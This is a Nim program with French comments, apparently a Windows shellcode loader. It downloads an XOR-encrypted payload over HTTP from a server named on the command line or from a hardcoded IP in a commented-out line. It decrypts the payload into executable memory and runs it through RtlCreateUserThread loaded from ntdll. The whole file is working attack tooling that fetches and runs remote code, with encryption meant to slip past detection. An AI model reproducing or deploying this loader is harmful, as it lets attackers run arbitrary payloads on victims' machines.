import winim/lean
import std/httpclient
import std/os  

if paramCount() < 1:
    echo "[-] Usage: ", paramStr(0), " <ip of shellcode server>"
    quit(1)

# Construire l'URL avec l'IP fournie en paramètre
let shell_serv = paramStr(1)
const PORT = "8000"
let URL = "http://" & shell_serv & ":" & PORT & "/shellcode_encrypted.bin"

#commenter en haut et decommenter la ligne du bas si probleme avec les arguments 

#const URL = "http://159.65.208.238:8000/shellcode_encrypted.bin"

proc fetchShellcode(url: string): seq[byte] =
    let client = newHttpClient()
    try:
        return cast[seq[byte]](client.getContent(url))
    finally:
        client.close()



# Clé XOR sur 4 bytes
const XOR_KEY: array[4, byte] = [0x41'u8, 0xF3'u8, 0x89'u8, 0xC7'u8]

# Fonction de déchiffrement XOR
proc xorDecrypt(data: ptr UncheckedArray[byte], length: int, key: openArray[byte]) =
    for i in 0..<length:
        data[i] = data[i] xor key[i mod key.len]

echo "Téléchargement du shellcode..."
var shellcode = fetchShellcode(URL)

if shellcode.len == 0:
    echo "Erreur : impossible de récupérer le shellcode"
    quit(1)

echo "Shellcode téléchargé, taille : ", shellcode.len, " bytes"

# Allocation de la mémoire dans l'espace libre du PC
var pMemory = VirtualAlloc(
    NULL,
    cast[SIZE_T](shellcode.len),
    MEM_COMMIT or MEM_RESERVE,
    PAGE_EXECUTE_READWRITE
)

echo "Adresse mémoire allouée : 0x", toHex(cast[int](pMemory))

# Copier le shellcode chiffré en mémoire
copyMem(pMemory, addr shellcode[0], shellcode.len)

# Déchiffrer le shellcode en mémoire
var oldProtect: DWORD
VirtualProtect(pMemory, shellcode.len, PAGE_READWRITE, addr oldProtect)
xorDecrypt(cast[ptr UncheckedArray[byte]](pMemory), shellcode.len, XOR_KEY)
VirtualProtect(pMemory, shellcode.len, PAGE_EXECUTE_READ, addr oldProtect)

# Création du thread...
type
   PRTLCREATEUSERTHREAD = proc(
       ProcessHandle: HANDLE,
       SecurityDescriptor: PSECURITY_DESCRIPTOR,
       CreateSuspended: BOOLEAN,
       StackZeroBits: ULONG,
       StackReserved: PSIZE_T,
       StackCommit: PSIZE_T,
       StartAddress: PVOID,
       StartParameter: PVOID,
       ThreadHandle: PHANDLE,
       ClientId: PCLIENT_ID
   ): NTSTATUS {.stdcall.}

# Charger la DLL ntdll.dll qui contient RtlCreateUserThread
let ntdll = LoadLibraryA("ntdll.dll")
# Obtenir l'adresse de la fonction RtlCreateUserThread
let RtlCreateUserThread = cast[PRTLCREATEUSERTHREAD](GetProcAddress(ntdll, "RtlCreateUserThread"))

var threadHandle: HANDLE
var clientId: CLIENT_ID

# Création du thread avec RtlCreateUserThread
let status = RtlCreateUserThread(
   GetCurrentProcess(),    # Utilise le processus actuel
   NULL,                   # descripteur de sécurité
   FALSE,                  # Ne pas créer en état suspendu
   0,                      # adresse de pile
   NULL,                   # Taille de pile
   NULL,                   # Commit de pile
   pMemory,                # shellcode comme point d'entrée
   NULL,                   
   addr threadHandle,      # Récupère le handle du thread
   addr clientId           # Récupère l'ID du thread
)

if NT_SUCCESS(status):
   echo "Thread créé avec ID: ", clientId.UniqueThread
   discard WaitForSingleObject(threadHandle, 10000)  # 10 secondes max
   CloseHandle(threadHandle)  # Nettoie le handle
else:
   echo "Erreur lors de la création du thread: ", status


echo "Appuyez sur Entrée pour terminer..."
discard readLine(stdin)